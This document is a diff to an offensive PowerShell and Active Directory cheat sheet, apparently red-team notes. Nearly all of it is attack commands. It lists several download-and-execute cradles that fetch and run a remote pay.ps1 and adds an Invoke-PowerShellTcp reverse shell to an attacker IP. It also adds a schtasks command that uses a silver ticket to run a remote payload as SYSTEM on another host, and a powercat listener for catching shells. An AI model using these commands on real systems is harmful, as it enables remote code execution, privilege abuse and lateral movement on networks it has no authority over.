@@ -96,7 +96,7 @@ Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose\
 Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1\
 Get-Command -Module ActiveDirectory
 
-### Module
+### Import Modules / Execute
 
 **Import a module/file**\
 Import-Module \<modulepath>
@@ -111,11 +111,11 @@ ls function:
 
 iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)
 
-&#x20;**Use a COM Object**
+#### &#x20;**Use a COM Object**
 
 $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://webserver/pay.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
 
-**PSv3 or newer**
+#### **PSv3 or newer**
 
 Iex (iwr '[http://websever/ps.ps1](http://websever/ps.ps1)') -iwr is alias for invoke-web request
 
@@ -125,6 +125,35 @@ Msxml2.xmlhttp;$h.open('GET','http://webserver/ps.ps1',$fasle);$h.send();iex $h.
 &#x20;$wr = \[System.NET.WebRequest]::Create("http://werbser.ps.ps1")\
 $r = $wr.GetResponse()\
 IEX (\[System.IO.StreamReader]\($r.GetResponseStream())).ReadToEnd()
+
+**Invoke\_PowerShellTCP.ps1**
+
+Add line at the end of the script:\
+Invoke-PowershellTcp -Reverse -IPAddress attackersIP -Port port
+
+
+
+## Other
+
+**Display/delete Kerberos Tickets**\
+****klist\
+klist purge
+
+**List tasks**\
+schtasks /S hostname.dom.local
+
+**Schedudle an execute a task with silver ticket of "HOST" Service** \
+schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke\_powerShellTcp.ps1''')'"&#x20;
+
+schtasks /Run /S hostname.dom.local /TN "STCheck"
+
+**Start listener**\
+****. .\powercat.ps1\
+powercat -l -v -p 443 -t 1000\
+&#x20; When connected press a few times enter
+
+**HFS Webserver tool**\
+****Drag & drop files in window to host it
 
 &#x20;
 
